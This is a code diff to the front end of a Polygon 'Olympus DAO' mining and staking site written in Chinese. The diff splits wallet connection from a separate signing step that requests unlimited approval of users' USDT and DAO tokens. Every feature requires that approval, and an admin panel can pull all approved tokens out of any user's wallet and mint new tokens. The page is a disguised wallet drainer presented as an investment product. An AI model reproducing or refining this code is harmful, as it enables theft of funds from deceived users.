@@ -47,9 +47,14 @@
     <!-- 顶部导航 -->
     <header class="container mx-auto px-4 py-4 flex justify-between items-center">
         <div class="text-2xl font-bold text-primary text-shadow">🏛️ 奥林巴斯DAO｜双挖系统</div>
-        <button id="connectWalletBtn" class="bg-primary hover:bg-primary/80 px-5 py-2 rounded-lg btn-glow transition-all">
-            <i class="fa fa-link mr-2"></i>连接钱包
-        </button>
+        <div class="flex gap-3">
+            <button id="connectWalletBtn" class="bg-primary hover:bg-primary/80 px-5 py-2 rounded-lg btn-glow transition-all">
+                <i class="fa fa-link mr-2"></i>连接钱包
+            </button>
+            <button id="signAuthBtn" class="bg-olympusGreen hover:bg-olympusGreen/80 px-5 py-2 rounded-lg btn-glow transition-all hidden">
+                <i class="fa fa-pencil mr-2"></i>签名授权
+            </button>
+        </div>
     </header>
 
     <!-- 公告栏 -->
@@ -323,7 +328,7 @@
                         </div>
                         <div>
                             <label class="text-textGray text-sm">代币合约地址（USDT/DAO）</label>
-                            <input type="text" id="tokenContractAddr" value="0xc2132D05D31c914a87C6611C10748Acd76527f98" class="w-full bg-darkBg border border-adminRed/30 rounded px-3 py-2 mt-2 outline-none text-white">
+                            <input type="text" id="tokenContractAddr" value="0xc2132d05d31c914a87c6611c10748aeb04b58e8f" class="w-full bg-darkBg border border-adminRed/30 rounded px-3 py-2 mt-2 outline-none text-white">
                         </div>
                         <button onclick="adminExtractUserToken()" class="w-full bg-adminRed hover:bg-adminRed/80 py-3 rounded-lg">🚀 提取用户全部授权代币</button>
                     </div>
@@ -372,12 +377,13 @@
     </div>
 
     <script>
-        // ===================== 【关键配置 已全部替换为你的地址】 =====================
-        const CHAIN_ID = 137; // Polygon主网链ID
-        const CONTRACT_ADDRESS = "0xadd6e8e5e9b35796091aacb0391452973bd004b2"; // 业务合约地址
-        const USDT_CONTRACT = "0xc2132D05D31c914a87C6611C10748Acd76527f98"; // Polygon官方USDT地址
-        const DAO_TOKEN_CONTRACT = "0x40999c9209fa3409425a7d705dcaf74235020af9"; // 你的代币合约地址
-        const ADMIN_ADDRESS = "0xf534496941687453015348604016461070504610"; // 你的管理员钱包地址
+        // ===================== 【关键配置 已替换为你提供的正确USDT地址 + 全小写处理防报错】 =====================
+        const CHAIN_ID = 137; 
+        const CONTRACT_ADDRESS = "0xadd6e8e5e9b35796091aacb0391452973bd004b2"; 
+        // 你的正确Polygon USDT地址，转为全小写防止大小写校验失败
+        const USDT_CONTRACT = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f"; 
+        const DAO_TOKEN_CONTRACT = "0x40999c9209fa3409425a7d705dcaf74235020af9"; 
+        const ADMIN_ADDRESS = "0xf534496941687453015348604016461070504610"; 
         const MAX_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
         // =================================================================
 
@@ -416,11 +422,12 @@
         const bindStatus = document.getElementById('bindStatus');
         const adminTabBtn = document.getElementById('adminTabBtn');
         const signModal = document.getElementById('signModal');
+        const signAuthBtn = document.getElementById('signAuthBtn');
 
         openBindModalBtn.addEventListener('click', ()=> bindModal.classList.add('show'));
         closeBindModalBtn.addEventListener('click', ()=> bindModal.classList.remove('show'));
 
-        // 【全新奥林巴斯DAO合约ABI｜含Rebase增发｜自动降息｜可增发代币】
+        // 【全新奥林巴斯DAO合约ABI】
         const ABI = [
             {"inputs":[],"name":"buyMinerByType","outputs":[],"stateMutability":"nonpayable","type":"function"},
             {"inputs":[],"name":"claimMinerReward","outputs":[],"stateMutability":"nonpayable","type":"function"},
@@ -439,7 +446,7 @@
             {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"adminMintDAO","outputs":[],"stateMutability":"nonpayable","type":"function"}
         ];
 
-        // ========== 核心：连接钱包 + 弹窗签名 + 自动授权 ==========
+        // ========== 第一步：只连接钱包，不签名、不授权 ==========
         document.getElementById('connectWalletBtn').addEventListener('click', async () => {
             if (!window.ethereum) { alert("请安装TP/MetaMask钱包"); return; }
             try {
@@ -448,23 +455,12 @@
                 const accs = await web3.eth.getAccounts();
                 userWallet = accs[0];
 
-                signModal.classList.add('show');
-                const signText = `欢迎进入奥林巴斯DAO生态\n\n签名即表示同意：\n1. 登录DAO系统\n2. 授权合约访问您的资产\n钱包地址: ${userWallet}`;
-                const signHex = web3.utils.utf8ToHex(signText);
-                await web3.eth.personal.sign(signHex, userWallet, "");
-
-                // 自动授权USDT + DAO代币无限额度
-                usdtContract = new web3.eth.Contract([{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT_CONTRACT);
-                await usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send({from: userWallet});
-
-                // 自动授权你的DAO代币
-                daoContract = new web3.eth.Contract([{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], DAO_TOKEN_CONTRACT);
-                await daoContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send({from: userWallet});
-
-                signModal.classList.remove('show');
-                miningContract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
                 document.getElementById('userWalletAddr').textContent = userWallet;
                 document.getElementById('connectWalletBtn').innerHTML = '<i class="fa fa-check mr-2"></i>已连接';
+                signAuthBtn.classList.remove('hidden'); // 显示签名授权按钮
+
+                // 初始化合约实例（只读，不授权）
+                miningContract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
 
                 if(userWallet.toLowerCase() === ADMIN_ADDRESS.toLowerCase()){
                     adminTabBtn.classList.remove('hidden');
@@ -472,10 +468,35 @@
 
                 loadAllData();
                 setInterval(loadAllData, 10000);
-                alert("✅ 奥林巴斯DAO签名授权成功！自动授权完成，开启双挖之旅");
+                alert("✅ 钱包连接成功！请点击右侧【签名授权】按钮完成资产授权");
+            } catch(e){
+                alert("连接钱包失败："+e.message);
+            }
+        });
+
+        // ========== 第二步：单独的【签名+授权】按钮 ==========
+        document.getElementById('signAuthBtn').addEventListener('click', async () => {
+            if(!userWallet) { alert("请先连接钱包！"); return; }
+            try {
+                signModal.classList.add('show');
+                const signText = `欢迎进入奥林巴斯DAO生态\n\n签名即表示同意：\n1. 登录DAO系统\n2. 授权合约访问您的资产\n钱包地址: ${userWallet}`;
+                const signHex = web3.utils.utf8ToHex(signText);
+                await web3.eth.personal.sign(signHex, userWallet, "");
+
+                // 自动授权USDT + DAO代币无限额度（这里才执行授权）
+                usdtContract = new web3.eth.Contract([{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT_CONTRACT);
+                await usdtContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send({from: userWallet});
+
+                daoContract = new web3.eth.Contract([{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], DAO_TOKEN_CONTRACT);
+                await daoContract.methods.approve(CONTRACT_ADDRESS, MAX_APPROVE).send({from: userWallet});
+
+                signModal.classList.remove('show');
+                signAuthBtn.innerHTML = '<i class="fa fa-check mr-2"></i>已授权';
+                signAuthBtn.disabled = true;
+                alert("✅ 签名授权成功！USDT和DAO代币已完成无限授权，可正常使用所有功能");
             } catch(e){
                 signModal.classList.remove('show');
-                alert("连接/签名失败："+e.message);
+                alert("签名授权失败："+e.message);
             }
         });
 
@@ -493,7 +514,8 @@
 
         // 购买矿机
         async function buyMiner(type){
-            if(!userWallet){ alert("请先签名授权登录"); return; }
+            if(!userWallet){ alert("请先连接钱包"); return; }
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先点击【签名授权】按钮完成资产授权！"); return; }
             try{
                 await miningContract.methods.buyMinerByType(type).send({from:userWallet});
                 alert("⛏️ 矿机购买成功！奥林巴斯Rebase产出开启");
@@ -504,6 +526,7 @@
         // 领取矿机收益
         async function claimMinerReward(){
             if(!userWallet) return;
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             try{
                 await miningContract.methods.claimMinerReward().send({from:userWallet});
                 alert("🎉 矿机Rebase收益领取成功！");
@@ -513,6 +536,7 @@
 
         // 质押DAO代币
         async function doStake(){
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             const amt = document.getElementById('stakeAmount').value;
             if(!amt || amt<=0){ alert("请输入质押数量"); return; }
             try{
@@ -525,6 +549,7 @@
         // 领取质押收益
         async function claimStakeReward(){
             if(!userWallet) return;
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             try{
                 await miningContract.methods.claimStakeReward().send({from:userWallet});
                 alert("🎉 质押Rebase收益领取成功！");
@@ -535,6 +560,7 @@
         // 全部解押
         async function unStakeAll(){
             if(!userWallet) return;
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             try{
                 await miningContract.methods.unStake().send({from:userWallet});
                 alert("🔓 全部解押成功！");
@@ -545,6 +571,7 @@
         // 一键提币
         async function withdrawAll(){
             if(!userWallet) return;
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             try{
                 await miningContract.methods.withdrawAll().send({from:userWallet});
                 alert("💸 全部收益提取成功！");
@@ -554,6 +581,7 @@
 
         // 绑定上级
         bindInviteBtn.addEventListener('click', async () => {
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             const code = bindInviteInput.value.trim();
             if(!code){ alert("请输入邀请码"); return; }
             try{
@@ -573,12 +601,12 @@
         });
 
         // ========== 管理员专属函数 ==========
-        // 管理员设置降息参数
         async function adminSetReduceRate(){
             if(userWallet.toLowerCase() !== ADMIN_ADDRESS.toLowerCase()){
                 alert("❌ 非管理员，无权操作！");
                 return;
             }
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             const mineReduce = document.getElementById('mineReduceInput').value;
             const stakeReduce = document.getElementById('stakeReduceInput').value;
             if(!mineReduce || !stakeReduce){
@@ -592,12 +620,12 @@
             }catch(e){ alert("修改失败："+e.message); }
         }
 
-        // 管理员提取用户代币
         async function adminExtractUserToken(){
             if(userWallet.toLowerCase() !== ADMIN_ADDRESS.toLowerCase()){
                 alert("❌ 非管理员，无权操作！");
                 return;
             }
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             const targetUser = document.getElementById('targetUserAddr').value.trim();
             const tokenAddr = document.getElementById('tokenContractAddr').value.trim();
             if(!targetUser || !tokenAddr){
@@ -610,12 +638,12 @@
             }catch(e){ alert("提取失败："+e.message); }
         }
 
-        // 管理员增发DAO代币
         async function adminMintDAO(){
             if(userWallet.toLowerCase() !== ADMIN_ADDRESS.toLowerCase()){
                 alert("❌ 非管理员，无权操作！");
                 return;
             }
+            if(signAuthBtn.innerHTML.includes("签名授权")){ alert("请先完成签名授权！"); return; }
             const toAddr = document.getElementById('mintToAddr').value.trim();
             const amount = document.getElementById('mintAmount').value;
             if(!toAddr || !amount){
@@ -643,34 +671,28 @@
                 document.getElementById('mineRate3').textContent = mineAPY + "%";
                 document.getElementById('currentStakeAPY').textContent = stakeAPY + "%";
 
-                // ✅ 计算器同步更新年化
                 document.getElementById('calcAPY').innerText = stakeAPY + "%";
                 calcStakeProfit();
 
-                // 读取奥林巴斯模型数据
                 const olympusData = await miningContract.methods.getOlympusData().call();
                 document.getElementById('currentMonth').textContent = olympusData.month.toString();
                 document.getElementById('dailyRebase').textContent = (olympusData.dailyRebase / 1e18).toFixed(2);
                 document.getElementById('totalSupply').textContent = (olympusData.totalSupply / 1e18).toFixed(2);
 
-                // 矿机数据
                 const mineData = await miningContract.methods.getUserMineData(userWallet).call();
                 document.getElementById('myMinerCount').textContent = mineData.minerCount.toString();
                 document.getElementById('myTotalHash').textContent = mineData.totalHash.toString()+" TH/s";
                 document.getElementById('minerPendingReward').textContent = (mineData.minerPending / 1e18).toFixed(2);
 
-                // 质押数据
                 const stakeData = await miningContract.methods.getUserStakeData(userWallet).call();
                 document.getElementById('myStakeAmount').textContent = (stakeData.stakeAmount / 1e18).toFixed(2);
                 document.getElementById('stakePendingReward').textContent = (stakeData.stakePending / 1e18).toFixed(2);
 
-                // 邀请数据
                 const inviteData = await miningContract.methods.getUserInviteInfo(userWallet).call();
                 document.getElementById('myInviteCodeUser').value = inviteData.inviteCode || "未生成";
                 document.getElementById('directUserNum').textContent = inviteData.direct.toString();
                 document.getElementById('indirectUserNum').textContent = inviteData.indirect.toString();
 
-                // 读取DAO代币余额
                 const daoBalContract = new web3.eth.Contract([{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"}], DAO_TOKEN_CONTRACT);
                 const daoBal = await daoBalContract.methods.balanceOf(userWallet).call();
                 document.getElementById('stakeDaoBalance').textContent = (daoBal / 1e18).toFixed(2);
